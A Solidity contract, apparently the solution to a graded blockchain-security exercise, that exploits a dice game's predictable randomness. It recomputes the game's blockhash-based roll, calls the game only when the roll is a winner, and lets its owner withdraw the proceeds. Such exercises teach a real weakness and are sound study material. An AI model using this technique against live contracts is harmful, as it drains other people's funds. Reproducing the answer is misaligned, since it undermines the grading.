pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Receive function to allow the contract to receive Ether
    receive() external payable {}

    // Rigged Roll function to predict the outcome and only roll when it's a winning roll
    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "Not enough balance to roll");

        // Get the nonce from DiceGame contract
        uint256 nonce = diceGame.nonce();

        // Predict the randomness exactly like DiceGame does
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "Rigged Roll prediction:", roll);

        // Only call rollTheDice if we will win (roll < 5)
        require(roll < 5, "Expected roll to be a winner");
        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    // Withdraw function to transfer Ether to a specified address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{ value: _amount }("");
        require(sent, "Failed to send Ether");
    }
}
